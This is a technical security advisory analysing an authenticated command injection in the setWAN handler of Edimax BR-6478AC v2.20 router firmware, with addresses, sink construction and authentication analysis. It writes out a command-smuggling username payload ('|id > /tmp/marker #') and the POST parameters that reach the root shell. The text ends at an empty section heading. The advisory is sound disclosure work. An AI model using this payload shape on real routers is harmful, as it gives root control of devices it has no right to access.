# Edimax BR-6478AC v2.20 - setWAN WAN-Configuration Handler: Authenticated Command Injection to root Command Execution (full technical analysis)

## 1. Overview

### Overview — the finding in one paragraph

Firmware `BR6478AC_v2.20.bin` for the Edimax BR-6478AC dual-band AC1750 wireless
router ships a management HTTP server, `bin/webs`, that persists a WAN username by
running a shell. The registered handler `setWAN` at `0x441cec` (`POST
/goform/setWAN`) takes the PPP username straight out of the request body, copies it
into a stack buffer, scans it for exactly one character - a semicolon - and then
formats `echo %s > /tmp/UserName` with it and calls `system()`. Everything the
semicolon scan leaves alone becomes shell grammar. A username of
`|id > /tmp/marker #` therefore turns the sink line into
`echo |id > /tmp/marker # > /tmp/UserName`, in which the shell reads the `#` as a
comment that swallows the sink's own redirect and runs `id` as the second stage of a
pipeline. The handler is root - the shipped `etc/boa/boa.conf` declares
`User root` - so the landing identity is `uid=0(root)`. A second, structurally
identical construction exists in the same handler two more times, for the PPTP and
L2TP usernames, so one root cause produces three injectable parameters. Reaching any
of them needs one valid administrative credential for the product's single HTTP Basic
realm, which after device setup covers every `/goform/` path; the route carries no
post-boot uptime window, so it is available whenever the device is up. This advisory
rates the injection. The factory credential the firmware ships with is a separate
weakness reported below in its own right and is not part of the vector being scored,
and nothing in the chain involves privilege escalation, because the executing process
is already root.

### Overview — the product and the firmware artefact

- Product: Edimax BR-6478AC, a dual-band AC1750 SOHO wireless router with a wired
  LAN and a management interface on TCP port 80. Vendor: Edimax Technology Co.,
  Ltd., New Taipei City, Taiwan. Closed-source firmware.
- Product identity string recorded in the material analysed: `BR-6478AC_v2.20`.
- Firmware image: `BR6478AC_v2.20.bin`, containing a SquashFS root filesystem of
  roughly 2.3 MB.
- Target architecture recovered from the binaries: MIPS 32-bit big-endian, MIPS-I
  instruction set, uClibc C library, all binaries stripped, internal build timestamp
  from 2015.
- Management server binary: `bin/webs`, ELF 32-bit MSB MIPS, 762904 bytes, SHA256
  `ec39c0f9332361e37ab92f1999ac5f00f5742dd6db75f7cb26c0652cfedb32a1`. Every
  address in this document is an address inside that binary, so a reader holding the
  same image can reproduce each step.
- `webs` is a GoAhead-lineage embedded HTTP server that also parses the boa
  configuration file, so the device presents a single listener on port 80 with two
  configuration vocabularies; the `/goform/` dispatcher is the part relevant here.

### Overview — the runtime stack on the device

The root filesystem carries four HTTP-capable components and several ordinary
daemons. `bin/webs` serves the management interface: static content, `.asp` pages
bound as CGI by `AddType application/x-httpd-cgi asp` in `etc/boa/boa.conf`, and the
`/goform/` form handlers registered at run time by `websFormDefine`. A second
lightweight server, `axhttpd`, runs only during the setup wizard (started by
`iQsetup_set()` as `axhttpd -w /tmp/www &` from `scriptlib.sh:1184`) and serves only
generated static pages. A UPnP Internet-Gateway-Device daemon (`miniigd`, derived
from miniupnpd) listens on port 52869 and exposes SOAP actions. An outbound
cloud-connect daemon maintains a session to the vendor's cloud service and opens no
inbound listener. `webs` is kept alive by the boot path `cleanlog.sh:131`, invoked
from `init.sh:1115`, and writes `/var/run/webs.pid`.

### Overview — what evidence class each claim in this document rests on

1. **Artefact evidence, from the shipped firmware image**: `etc/boa/boa.conf`
   (`Auth / /etc/boa/boa.passwd`, `User root`, `AddType application/x-httpd-cgi
   asp`), the root filesystem layout, the boot and firewall scripts (`init.sh`,
   `cleanlog.sh`, `firewall.sh`), the shipped password file, and every instruction,
   format string and address in `bin/webs`. This is the evidence class for sections 3
   through 7.
2. **Dynamic evidence, from replication of the sink**: the exact command line that
   `sprintf` produces at `0x441ee8` was reconstructed and handed to `/bin/sh -c` in
   an isolated POSIX sandbox, once as root and once under an ordinary user account on
   a workstation, with benign control runs. This is section 9. It proves what
   `system()` does with the injected string; it does not prove that a physical device
   accepted an HTTP request from us, because none did.
3. **Reasoned inference, labelled as such**: the on-device landing identity
   (`uid=0(root)`) follows from the shipped `User root` directive plus the
   root-identity replication; the two additional injectable parameters
   (`pptpUserName`, `L2TPUserName`) follow from reading the same handler; the
   unauthenticated setup-state branch follows from reading `auth_authorize`; the
   sibling-model observation follows from a static comparison of a second firmware
   image. Each is marked where it appears.

### Overview — independence and the companion finding

Two independent command-injection sinks were found in this firmware and are published
together, because a fix to one does not fix the other. This document covers `setWAN`.
Its companion covers `formWlanMP`, a manufacturing / ATE radio-calibration handler at
`0x462a24` that formats thirty unvalidated calibration fields into
`sprintf(buf, "/bin/rftest_old.sh %s ...", ...)` at `0x462fd0` and calls `system(buf)`
at `0x46308c`, with no sanitisation of any kind on the path. The two differ in
handler, format string, sink addresses and defence posture: this one interpolates a
single username behind a one-character scan, that one interpolates thirty fields
behind nothing. They are not variants of each other, and the vendor should not expect
one patch point to close both - although the architectural fix (stop handing request
data to a shell) closes both.

CORRECTION, and the reason this paragraph reads differently from the version first published: a public
identifier already exists for this exact handler on this exact model family. CVE-2026-12807, numbered by a
third-party numbering authority, describes command injection in the `setWAN` function of the file
`/goform/setWAN` on the Edimax BR-6478AC V2, reached through the arguments `pppUserName`, `pptpUserName` and
`L2TPUserName`, and notes that the vendor had been contacted about that disclosure and did not respond. That is
this finding's handler, this finding's route and this finding's argument set. The earlier revision of this
advisory stated that no prior public record covered command injection in this handler and treated the finding as
previously undisclosed; that statement was wrong and is withdrawn here rather than silently removed. It was made
because the prior-art check could not be completed while the advisory was being written - the search tooling
available to us was returning an authorisation error - and the check was only run afterwards, against the public
identifier records, before any identifier request was filed. We did not discover this vulnerability
independently of the public record, and we are not claiming that we did.

What this advisory still contributes, offered as detail and not as novelty: the analysis of the specific firmware
build we hold, with the sink addresses and the exact format string read out of that image; the observation that
the one-character scan for `;` on this path is defeated completely by a payload using `|` together with a
trailing `#`, which is a statement about the shipped filter rather than about the argument names; the replication
run showing the injected marker and the absent benign control; and an instruction-level comparison against a
sibling firmware image whose `setWAN` handler matches ours. No identifier was requested for this finding and none
should be requested: an identifier already exists, and asking a numbering authority for a second one on the same
defect would create a competing duplicate rather than add information.

### Overview — the sibling-model observation, and its limits

While confirming the sink we compared a second Edimax firmware image we already held,
`BR-6208AC_V2_1.03`. Its `webs` is a different build - ELF 32-bit MSB MIPS-I, 816568
bytes, SHA256 `3ad10a41d11c8cd59185eab6c9ce67b18cd2118942eb2201f48540d7846a0328` -
but its `setWAN` implementation matches instruction for instruction: the handler
sits at `0x448710`, `websGetVar(pppUserName)` at `0x4488b8`, `strcpy` at
`0x4488bc`, the immediate-`0x3b` inline scan at `0x4488dc`-`0x4488fc`, the same
`echo %s > /tmp/UserName` `sprintf` at `0x448920` with its format string at
`0x4a6954`, and `system()` at `0x448940`, with the same three username parameters
behind the same three `wanMode` values. The differing addresses and binary size come
from a different product build; the vulnerable code path is the same source. We report
this so the vendor treats the defect as living in a shared software component rather
than in one product's tree. We did not test that model, we did not execute anything
against it, and no score in this advisory covers it - it is a static observation, and
it is labelled as one here and everywhere else it appears.

### Overview — affected scope

Only firmware `BR6478AC_v2.20.bin` was examined, and within it only this handler. The
handler is registered unconditionally in that image, so every device running it carries
all three injectable parameters. We did not test other firmware builds for this
product, the separately marketed BR-6478AC V2 hardware revision (whose firmware line,
for example `BR6478ACV2_v1.23`, is a different little-endian MIPS-II build of
`webs`), or any further Edimax model beyond the static comparison recorded above.

## 2. Vulnerability Summary

### Vulnerability Summary — one table

| Item | Value |
|---|---|
| Product | Edimax BR-6478AC (identity string `BR-6478AC_v2.20`) |
| Firmware image | `BR6478AC_v2.20.bin` (SquashFS rootfs, roughly 2.3 MB) |
| Vulnerable binary | `bin/webs`, ELF 32-bit MSB MIPS, 762904 bytes, SHA256 `ec39c0f9332361e37ab92f1999ac5f00f5742dd6db75f7cb26c0652cfedb32a1` |
| Route | `POST /goform/setWAN` |
| Handler | `setWAN` at `0x441cec`, registered by `websFormDefine("setWAN", ...)` at `0x478484` (name string `0x4a6250`) |
| Branch selection | `wanMode` field: `atoi` at `0x441d44`, stored with `apmib_set(0x102, ...)` at `0x441d54`, compared against 2 at `0x441d60`/`0x441d6c` |
| Tainted field (proven) | `pppUserName`, read at `0x441e74` (name string `0x4953f4`) |
| Tainted fields (same construction) | `pptpUserName` on `wanMode` 3, `L2TPUserName` on `wanMode` 6 |
| Only sanitisation | inline byte loop `0x441ebc`-`0x441ee4` comparing against immediate `0x3b` (`;`) and truncating |
| Sink construction | `sprintf(buf2, "echo %s > /tmp/UserName", buf)` at `0x441ee8`, format string at `0x49a510` |
| Sink call | `system(buf2)` at `0x441f1c` (PLT slot `0x4c6d60`) |
| Escape that arrives too late | `#` to `\#` loop `0x441f4c`-`0x441fb0`, writing the configuration buffer stored by `apmib_set(0x6d, ...)` at `0x44200c` |
| Authentication | HTTP Basic, single `/` realm, required in normal operation |
| Execution identity | `webs` running as root (`User root` in `etc/boa/boa.conf`); landing identity `uid=0(root)` |
| Uptime gate | not applicable - the route is not one of the four gated paths |
| Class | CWE-78 OS command injection |
| Published score | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = 7.2 High |

### Vulnerability Summary — mechanics, step by step

1. An authenticated client submits `POST /goform/setWAN` with
   `Content-Type: application/x-www-form-urlencoded` and a body beginning
   `wanMode=2&pppUserName=<payload>`, which is the shape the product's own
   `wan.asp` page sends when an owner configures a PPP uplink.
2. `process_header_end` at `0x40c4d4` runs `auth_authorize` (`0x404d00`); in normal
   operation the security store at `0x4c7004` - one entry, prefix `/`, type `Basic` -
   produces a `401` challenge unless a valid credential arrives.
3. `handleForm` at `0x412440` resolves the name `setWAN` and calls the handler at
   `0x441cec`.
4. `websGetVar(wp, "wanMode", "")` at `0x441d3c` is converted with `atoi` at
   `0x441d44` and stored with `apmib_set(0x102, &wanMode)` at `0x441d54`. The
   comparison at `0x441d60`/`0x441d6c` branches to `0x441e74` when the mode is 2,
   skipping the static-IP branch (`0x441db0`-`0x441e40`) that contains the only
   `inet_aton` calls in the function.
5. `websGetVar(wp, "pppUserName", "")` at `0x441e74` returns the decoded field.
   `strcpy` at `0x441e94` copies it into a fixed stack buffer, and `strlen` at
   `0x441ea8` produces the loop bound.
6. The inline scan between `0x441ebc` and `0x441ee4` loads `addiu a0, zero, 0x3b`
   and walks the buffer a byte at a time (`lb`, `bne`), writing a NUL at the first
   semicolon. No validator function is called.
7. `sprintf(buf2, "echo %s > /tmp/UserName", buf)` at `0x441ee8` builds the command
   line, unquoted, and `system(buf2)` at `0x441f1c` runs it through `/bin/sh -c`.
8. The shell parses the payload: `|` opens a pipeline and the trailing ` #` comments
   out the remainder of the line, including the sink's own ` > /tmp/UserName`. The
   injected command runs with the identity of `webs`, which is root.
9. Only afterwards does the handler escape `#` to `\#` in a loop between `0x441f4c`
   and `0x441fb0`, and only in the configuration buffer that `apmib_set(0x6d, ...)`
   stores at `0x44200c`. The sink has already executed with the unescaped value.

### Vulnerability Summary — preconditions

- The device must be up and past its setup wizard, with the management interface
  reachable from the attacker's position. Under the shipped firewall posture
  (`firewall.sh:187` sets `iptables -P INPUT DROP`, `firewall.sh:180` drops
  WAN-originated `SYN`, `firewall.sh:189` accepts non-WAN input) that means a host on
  the attached LAN or Wi-Fi segment unless remote management or a port forward is
  enabled.
- The attacker must hold a valid credential for the single HTTP Basic realm
  (`PR:H` in the score). Any credential the realm accepts is sufficient; the factory
  password is not relied upon and drives only a labelled conditional reading.
- The request must select an injectable branch, which the attacker controls
  completely: `wanMode=2` with `pppUserName`, `wanMode=3` with `pptpUserName`, or
  `wanMode=6` with `L2TPUserName`.
- Nothing else: no uptime window, no reboot, no user interaction, no memory-layout
  knowledge, no radio state.

### Vulnerability Summary — why the root cause is a shell used as a storage driver

The interesting defect here is not the missing filter but the reason a filter was
needed at all. The handler's job at this point is to persist one string so that a
helper can read it later. It does that by asking a shell to run `echo`. That choice
imports the entire shell grammar into a data path and makes the developer responsible
for neutralising every metacharacter - a responsibility the code then discharges by
checking exactly one of them. Reading the instruction sequence shows the developer was
aware of the hazard: an escape pass for `#` does exist, at `0x441f4c`, and it is
applied to the value that goes into the configuration store. It is simply not applied
to the value that goes into the shell, and it runs after the shell has been invoked.
The fix that removes the class is to stop using a shell as a storage driver: write the
file with a file API or store the value directly through `apmib_set`, which the same
function already calls.

## 3. Authentication Boundary

### Authentication Boundary — the gate function

The gate is `auth_authorize` at `0x404d00`, called from `process_header_end` at
`0x40c4d4` for every request the `/goform/` dispatcher handles. Its logic is read
from the disassembly rather than a decompiler rendering, because the decompiler
inverts one of the branches:

```c
apmib_get(0x1bc, &local);        /* 0x404d14 / 0x404d2c, apmib_get = 0x4c6d14 */
flag = local;                    /* setup-wizard flag */

if (flag == 0) {
    /* BLOCK C: captive-portal probe */
    if (path is "/generate_204") { send_r_no_content(); return 0; }
    /* BLOCK B: no challenge issued */
    if (path is not one of {"/mp.asp", "/index.asp", "/"})
        return 1;                /* 0x4052d0 - ALLOW */
}
/* BLOCK A: security-store matching loop, then HTTP Basic */
for (entry : security_store) {   /* table at 0x4c7004 */
    if (url_matches(entry)) {
        if (entry.type == "None") return 1;
        return basic_auth_challenge_or_accept(entry);
    }
}
```

The store is filled at run time from the configuration: the `Auth` directive handler
at `0x40814c` calls the function pointer in slot `0x4c6cd4`, which resolves to
`auth_add` at `0x40549c`, as `auth_add(url, password_file, "Basic")`. The shipped
`etc/boa/boa.conf` contains exactly one `Auth` directive -
`Auth / /etc/boa/boa.passwd` - so the finished store has one entry: prefix `/`, type
`Basic`, password file `/etc/boa/boa.passwd`. A prefix of `/` matches every request
path, which is how the realm comes to cover all of `/goform/`.

### Authentication Boundary — what the configuration flag means, and how that was established

Object `0x1bc`, read through `apmib_get`, selects the branch. Nothing in the binary
prints its meaning, so three independent shipped artefacts were used, and all three
agree that `0` is the setup wizard and `1` is normal operation.

1. `formwizResetDefault` at `0x44cdbc` runs `/bin/scriptlib_util.sh flashDefault`,
   then `reboot.sh 2 &`, then resets the configuration store, and displays
   `Resettowizard` via `showText`. A factory reset therefore drives the flag to `0`,
   and the product's own wording for that state is "wizard".
2. With the flag at `0`, a request for `/generate_204` is answered `204 No Content`
   by the gate itself. `/generate_204` is a captive-portal connectivity probe, which a
   configured management interface would not answer at all.
3. `formWizSetup` assigns `_obj.wizardEnabled = atoi(websGetVar(wp, "wizEnabled", ""))`
   and prints `NO - LOGIN-WEB` when the value is `1` - the product's own phrase for
   "authentication is now active". Management pages read the same flag to switch their
   interface: `web/inter_wan.asp:214` and `web/admin_timezone.asp:95` both render
   `var wizardEnabled = <%getVar("wizardEnabled","","");%>;`, and
   `setup_3wizard_2.asp` posts its reset control to `/goform/formwizResetDefault`.

That reading governs the rating. It was established after an earlier pass reached the
opposite conclusion - reading block B as an unauthenticated *post-setup* path, which
would have made this an unauthenticated root RCE. The three artefacts above refute
that, so the finding is rated `PR:H` and the flag-`0` branch is documented in section
12 as a labelled conditional inference about a transient setup state. We note for
completeness that authentication models of other Edimax products do not transfer: the
neighbouring BR6478GN uses the GoAhead 2.1.8 user-management API
(`umAddAccessLimit`), a different mechanism from parsing boa directives into a
security store.

### Authentication Boundary — the realm and its single principal

- One realm, one prefix, one type. The store holds a single `/` entry of type
  `Basic`; the alternative type string `None` (at `0x49070c`) is referenced only by
  the gate's comparison and is never passed to `auth_add`, and no directive in the
  shipped configuration produces it.
- No per-user access control. The `Allow` directive handler at `0x407688` is a stub
  whose body prints "This version of Boa doesn't support access controls. Please
  recompile with --enable-access-control.", the shipped `boa.conf` has no `Allow`
  directive, and our reading of that configuration found no per-user or per-group
  access restriction.
- One credential. `/etc/boa/boa.passwd` is the product's only credential store and
  holds one account; the management interface's own password-change form operates on
  that single account, and there is no read-only or operator role.

Any caller the realm accepts is therefore the device administrator, which CVSS 3.1
treats as `PR:H`: privileges providing significant control over the component's
configuration. Section 12 prints the arithmetic for both readings.

### Authentication Boundary — why this route is not uptime-gated

Four routes in this firmware carry a 600-second post-boot gate - `/mp.asp`,
`/goform/mp`, `/advanced_management.asp` and `/goform/formAdvManagement` - reading
`/proc/uptime` and redirecting to `/index.asp` once the device has been up longer than
ten minutes. `/goform/setWAN` is not among them; the handler contains no uptime read.
The consequence is practical rather than theoretical: WAN configuration is something an
owner changes months after installation, and the route must work at that point, so an
attacker holding a credential faces no window at all. By contrast the neighbouring
manufacturing route `/goform/mp` (handler at `0x448e9c`) reads a `command` field,
truncates at the first `;` with `strchr` at `0x448fe8`, formats
`sprintf(buf, "/bin/rftest.sh %s > /tmp/rftest.out", command)` at `0x449108` and calls
`system(buf)` at `0x44911c` - it is exploitable in principle but confined to the boot
window, so it is reported as an observation and carries no score here.

### Authentication Boundary — the branch we do not treat as a supported path

When the setup-wizard flag reads `0`, block B returns success without a challenge for
any path outside `/mp.asp`, `/index.asp` and `/`. In that state `/goform/setWAN` needs
no credential at all. We neither rate the product on that state nor claim an
unauthenticated exploit: it is the install wizard, it is transient, we never exercised
it, and a first-run provisioning path is not the finding this advisory rates. It is
published as a conditional reading in section 12 with its arithmetic, because operators
need to know that a device reset to defaults and left unconfigured is exposed in a way
a configured device is not.

### Authentication Boundary — what is deliberately not claimed

- No authentication bypass. In the normal-operation state the gate is a hard `401`
  challenge against a real digest store, and we found no path that makes it accept a
  request without a valid credential.
- No CSRF claim in either direction. We did not establish whether the management
  interface issues a same-site token alongside Basic authentication; if it does not,
  an attacker who can make the administrator's browser submit this form needs no
  credential of their own. Flagged to the vendor as unexamined surface.
- No session or logout mechanism: authentication is per-request Basic, so a client
  that caches the credential resends it forever, and nothing server-side invalidates
  it.

## 4. Attack Surface

### Attack Surface — listeners and who owns what

| Listener | Owner | Reach | Role in this finding |
|---|---|---|---|
| TCP port 80 | `bin/webs` (boa configuration shared) | LAN / Wi-Fi by default; WAN only if the operator enables remote management or forwards the port | the vulnerable surface |
| TCP port 52869 | `miniigd` (UPnP IGD, miniupnpd-derived) | LAN only, because the shipped policy drops WAN-originated input | examined, not part of this finding |
| axhttpd port | second helper HTTP server, started by `iQsetup_set()` via `scriptlib.sh:1184` | setup state only | examined, not part of this finding |
| outbound cloud session | cloud-connect daemon | egress only | excluded |
| SSH / DHCP / DNS daemons | standard third-party daemons | - | out of scope |

The default firewall posture bounds the network metric and is worth stating exactly:
`firewall.sh:187` installs `iptables -P INPUT DROP`, `firewall.sh:180` drops
WAN-originated `SYN` packets, and `firewall.sh:189` accepts input on every other
interface. A stock device therefore does not answer new connections from its WAN side,
while everything behind it can reach port 80. That posture is a side effect of a
firewall script rather than a documented product statement about management-plane
exposure, which is why section 12 publishes `AV:N` as the headline with the `AV:A`
arithmetic printed alongside it.

### Attack Surface — the /goform/ handler population

Counting registrations in the shipped `webs` binary gives 91 `/goform/form*` handlers
plus 31 ASP handlers, well over 100 distinct HTTP endpoints, of which roughly 85
handlers reach a `system()` or `popen()` call. They divide into configuration setters
(which write into the configuration store and invoke helper scripts as a side effect),
diagnostic handlers (which interpolate request data into shell commands), and
manufacturing handlers (which should not be registered in a production image at all).
`setWAN` is a configuration setter that happens to use a shell to persist a value - the
most dangerous of the three shapes, because it is a route that legitimate owners use
routinely and that administrators therefore expect to keep working, which is why it is
reachable long after any factory-test window would have closed.

### Attack Surface — routes that bypass the realm, and why none of them matters here

Three request paths are exempt from the gate: `/upnp/APDesc.xml`, `/wpad.dat` and
`/file/*`. All three serve static content - a UPnP device description, a proxy
auto-configuration file, and files from `web/file/` such as `APP.gif`, `jquery.js` and
`set.css`. None reaches a `system()` or `popen()` call and none runs a CGI or a form
handler, so they widen what an unauthenticated caller can read but provide no execution
primitive.

The one unauthenticated execution primitive we found is in `miniigd`, not in the
management interface: its `AddPortMapping` SOAP action is handled without
authentication as UPnP specifies, and the vendor's handler interpolates
`NewInternalClient` into `sprintf(acStack_f8, "echo \"%s,...\" >> /tmp/upnp_info", ...)`
before calling `system()`. It is excluded here because port 52869 is reachable only
from the LAN under the shipped policy (the daemon binds every interface,
`INADDR_ANY` at `main` `0x4040b0`, but WAN-side input is dropped). It is reported to
the vendor as a real, separately exploitable LAN-side weakness, since a guest wireless
client reaches it.

### Attack Surface — surfaces examined and excluded

- `formrefresh` (network-neighbourhood refresh): the interpolated value is the
  device's own bridge address converted with `inet_ntoa`, not request data. Dead end.
- `formAutoFWupgrade` (TFTP firmware upgrade): arguments come from the configuration
  store and a fixed vendor host name, not directly from the request. Weak, not
  published.
- `formPreventionSetup` (denial-of-service prevention settings): a configuration
  setter with no direct command interpolation.
- `wscd` (Wi-Fi protected setup): its `system()` calls interpolate a fixed interface
  name (`wlan0` / `wlan1`) into a fixed `iwpriv` command, not network input.
- `edx_cloud`: outbound only.

### Attack Surface — how the surface was mapped

The mapping was done against the shipped image, not a running device: extract the
SquashFS root filesystem; enumerate the configuration files (`etc/boa/boa.conf`, boot
scripts, firewall script); locate `websFormDefine` call sites and read their string
arguments to enumerate the registration table; enumerate the ASP handler table the same
way; and for each registered name disassemble the handler and follow its data to every
`system()`, `popen()` or `execve` call, inspecting every intermediate function for
validation. Where disassembly and decompilation disagreed - notably in
`auth_authorize`, where the `/generate_204` branch is inverted by the decompiler - the
instruction stream was treated as ground truth.

For this handler specifically, the mapping continued inside the function: the branch
structure was walked from `0x441cec` to `0x44200c` instruction by instruction, every
call target resolved through the global-offset slots (`strcpy` at `0x4c6ef0`, `strlen`
at `0x4c6838`, `sprintf` at `0x4c6974`, `system` at `0x4c6d60`, `apmib_set` through
`0x4c6d14`'s neighbour), and the inline scan at `0x441ebc`-`0x441ee4` read as raw
instructions rather than as a decompiler summary, because a one-branch byte loop is
exactly the kind of construct a decompiler renders as something larger than it is.

## 5. Sink Identification

### Sink Identification — finding the sink

The sink was found by enumerating every `system` call site in `bin/webs` and walking
backwards through the arguments. The call at `0x441f1c` goes through the global-offset
PLT slot `0x4c6d60`, so it resolves to the real libc `system`. Its argument is a second
stack buffer filled immediately before by the `sprintf` at `0x441ee8`, whose format
string lives at `0x49a510` and reads `echo %s > /tmp/UserName`. The single `%s` is fed
from the first buffer, which was filled by the `strcpy` at `0x441e94` out of the return
value of `websGetVar(wp, "pppUserName", "")` at `0x441e74`, with one byte loop applied
in between. So the chain is four steps long and has one filter step.

### Sink Identification — the sink construction, instruction by instruction

```
setWAN                          @ 0x441cec   handler entry
  websGetVar(wp,"wanMode","")    @ 0x441d3c -> atoi @ 0x441d44
  apmib_set(0x102,&wanMode)      @ 0x441d54
  addiu v1, zero, 2              @ 0x441d60
  beq v0, v1, 0x441e74           @ 0x441d6c   /* wanMode == 2 -> PPP branch  */
  /* static-IP branch (wanMode == 1) 0x441db0-0x441e40 holds inet_aton
     at 0x441dd0 and 0x441e14; reached via 0x441d8c, NOT by the PPP path */
  websGetVar(wp,"pppUserName","") @ 0x441e74   /* name string @ 0x4953f4 */
  strcpy(buf, <raw>)              @ 0x441e94   /* strcpy  @ 0x4c6ef0 */
  strlen(buf)                     @ 0x441ea8   /* strlen  @ 0x4c6838 */
  addiu a0, zero, 0x3b            @ 0x441ebc   /* inline scan: ';' only */
  lb a1, (a1) / bne a1, a0        .. 0x441ee4  /* NUL-terminate at first ';' */
  sprintf(buf2, "echo %s > /tmp/UserName", buf) @ 0x441ee8
                                               /* fmt @ 0x49a510, sprintf @ 0x4c6974 */
  system(buf2)                    @ 0x441f1c   /* PLT slot 0x4c6d60 */
                                               /* -> /bin/sh -c <buf2>          */
  '#' -> '\#' escape loop         0x441f4c..0x441fb0   /* config buffer only */
  apmib_set(0x6d, ...)            @ 0x44200c
```

Every call target on the path was resolved through its global-offset slot, and the byte
loop was read as raw instructions rather than from a decompiler summary. The loop's
entire semantic content is: load `0x3b` into `a0`, walk the buffer one byte at a time,
and if a byte equals `0x3b` write `0` there and stop. There is no second character, no
second loop, and no function call in that range.

### Sink Identification — sanitiser audit, every call between source and sink

| Address | Call or construct | Effect on the value | Validation? |
|---|---|---|---|
| `0x441e94` | `strcpy` | copies the raw request value into a fixed stack buffer | none |
| `0x441ea8` | `strlen` | produces the bound for the scan loop | none |
| `0x441ebc`-`0x441ee4` | inline byte loop, immediate `0x3b` | truncates the buffer at the first `;` | the only sanitisation on the path |
| `0x441ee8` | `sprintf` | formats `echo <value> > /tmp/UserName`, unquoted | none |
| `0x441f1c` | `system` | hands the line to `/bin/sh -c` | sink |
| `0x441f4c`-`0x441fb0` | `#` to `\#` loop | escapes `#`, into the configuration buffer | after the sink, wrong buffer |

No `regex` call, no `inet_aton`, no `isdigit`, no `isalnum`, no `strchr`, no `strcspn`,
no vendor validation helper and no custom validator function appears between
`websGetVar` and `system`. The `inet_aton` calls that do exist in this function - at
`0x441dd0` and `0x441e14` - belong to the static-IP branch (`wanMode` 1), reached via
the branch at `0x441d8c`; the `wanMode` 2 comparison sends execution directly to
`0x441e74` and never enters that code. This is a point where a quick read of the
decompilation misleads, because the function as a whole does contain address
validation; it simply does not contain any on the path that matters.

### Sink Identification — the escape pass that arrives too late

At `0x441f4c` the handler begins a loop that replaces `#` with `\#`, running to
`0x441fb0`. Two facts dispose of it as a defence. First, the instruction order: the
loop is after `system()` at `0x441f1c`, and there is no branch back. Second, the
buffer: the loop writes into the configuration buffer at `sp+0x18`, which is what
`apmib_set(0x6d, ...)` stores at `0x44200c`, not the buffer that was handed to the
shell. So the developer escaped `#` for the value that gets stored, and did not escape
anything for the value that gets executed. That is a defensible priority if the threat
model is "a hash in a stored username breaks a later script that reads the
configuration", and it is no defence at all against this sink. The dynamic run in
section 9 confirms the consequence: the `#` in the injected username reaches the shell
as a comment, and the sink's own redirect never fires.

### Sink Identification — execution identity of the process that calls system

The process is `webs`, and it is root. `etc/boa/boa.conf` declares `User root`, the
directive that would otherwise drop privileges; the boot path that starts the server
(`cleanlog.sh:131`, invoked from `init.sh:1115`) runs during early init as root; and the
server writes `/var/run/webs.pid`, which on this root filesystem requires root to
create. No `setuid`, `chroot`, namespace or capability drop appears in its startup
path. The shell spawned by `system()` is therefore root, which is why the impact
metrics are all High with no escalation step in the chain.

### Sink Identification — three isomorphic instances in one handler

| `wanMode` | Field | Sink address region | Configuration object written after the sink |
|---|---|---|---|
| 2 | `pppUserName` | `0x441e74`-`0x441f1c` | `0x6d` |
| 3 | `pptpUserName` | `0x4420d0` onward | `0xf3` |
| 6 | `L2TPUserName` | `0x44246c` onward | `0x128` |

All three use the same immediate-`0x3b` scan, the same `echo %s > /tmp/UserName`
format string and the same `system()` call shape, and all three are selected by a
value the request supplies. This is one root cause with three reachable parameters: a
patch that fixes only the PPP path leaves the PPTP and L2TP paths injectable. The
`wanMode` 2 path is the one verified end to end here - instruction by instruction, and
replicated dynamically in section 9 - while the other two are reported from reading the
same handler, which is a structural claim rather than a demonstrated one. The vendor
should treat all three as in scope for the same change, and should search the wider
`webs` population for the same format string, because `echo %s > <path>` is a storage
idiom rather than a one-off.

### Sink Identification — sibling-model comparison, static only

| Item | BR-6478AC (this advisory) | BR-6208AC (static observation) |
|---|---|---|
| Firmware | `BR6478AC_v2.20.bin` | `BR-6208AC_V2_1.03` |
| `webs` binary | ELF 32-bit MSB MIPS-I, 762904 bytes | ELF 32-bit MSB MIPS-I, 816568 bytes |
| `webs` SHA256 | `ec39c0f9332361e37ab92f1999ac5f00f5742dd6db75f7cb26c0652cfedb32a1` | `3ad10a41d11c8cd59185eab6c9ce67b18cd2118942eb2201f48540d7846a0328` |
| `setWAN` handler | `0x441cec` | `0x448710` |
| `websGetVar(pppUserName)` | `0x441e80` | `0x4488b8` |
| `strcpy` | `0x441e94` | `0x4488bc` |
| inline `;` scan (`a0` = `0x3b`) | `0x441ebc`-`0x441ee4` | `0x4488dc`-`0x4488fc` |
| `sprintf("echo %s > /tmp/UserName")` | `0x441ee8`, fmt `0x49a510` | `0x448920`, fmt `0x4a6954` |
| `system()` | `0x441f1c` | `0x448940` |
| Three isomorphic paths | `pppUserName` (2), `pptpUserName` (3), `L2TPUserName` (6) | same three, same `wanMode` values |
| Authentication | HTTP Basic, single `/` realm, flag `0x1bc` | same model, same flag |
| Evidence status | instruction-level plus dynamic replication | static comparison of a second image; nothing executed |

The differing addresses and binary size come from a different product build. What does
not differ is the vulnerable code path: the same format string, the same one-character
scan with the same immediate, the same three parameters and the same three mode values.
The reasonable inference is a shared source component in the vendor's router software
base, which is why we report it rather than keeping it to ourselves - a vendor fixing
one product should look for the same file in the other. It is not scored, not tested,
and not claimed as an exploited finding on that model.

### Sink Identification — adjacent observations, reported without a score

- **Unbounded copy into a fixed stack buffer.** The `strcpy` at `0x441e94` copies
  attacker-controlled bytes with no length argument into a fixed-size stack buffer, and
  the request parser does not clamp the field length to anything near that buffer's
  size. We did not develop an overflow, did not measure the buffer's exact capacity
  against the parser's limits, and make no exploitability claim; it is recorded here so
  that the vendor replaces the copy with a bounded one in the same patch (CWE-121
  class, untested).
- **Silent truncation corrupts stored configuration.** Because the scan writes a NUL at
  the first `;`, a legitimate username containing a semicolon - legal in some ISP and
  RADIUS conventions - is silently truncated before storage, so the WAN link then
  authenticates with a wrong credential and the owner sees no error explaining it. This
  is a correctness defect (CWE-20) that exists independently of the injection.
- **The sink's own side effect is a diagnostic.** A legitimate submission creates
  `/tmp/UserName`; a successful injection does not, because the trailing comment
  swallows the redirect. Operators and incident responders can use that asymmetry as
  an indicator, and section 10 expands on it.

## 6. Source Identification

### Source Identification — the tainted input and its transport

The source is the URL-encoded body of `POST /goform/setWAN`. The product's own
`wan.asp` page submits this form when an owner configures a PPP, PPTP or L2TP uplink, so
the request is ordinary for this device and reaches the handler through the same path a
legitimate submission does: `Content-Type: application/x-www-form-urlencoded`, with
`wanMode` selecting the branch and the username field carrying the value. Because the
payload travels in a POST body rather than a query string, it is not written into web
server access logs in typical embedded configurations, which reduces the forensic
footprint. No session cookie, referer check, custom header or CSRF token was found to
guard the request, and the Basic credential can be attached by any HTTP client.

### Source Identification — what websGetVar does and does not do

